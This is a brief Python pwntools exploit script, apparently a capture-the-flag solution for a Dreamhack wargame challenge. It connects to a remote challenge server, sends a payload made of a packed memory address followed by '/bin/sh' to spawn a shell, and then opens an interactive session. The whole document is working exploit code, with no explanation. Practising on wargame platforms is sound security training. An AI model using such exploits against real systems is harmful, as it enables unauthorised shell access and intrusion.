from pwn import *

r = remote("host1.dreamhack.games", 13990)

# ret_address = int(b"0x080485db",16)

payload = p32(0x0804a0b0)
payload += b"/bin/sh"

r.recvuntil(b" ")
r.send(payload)
r.interactive()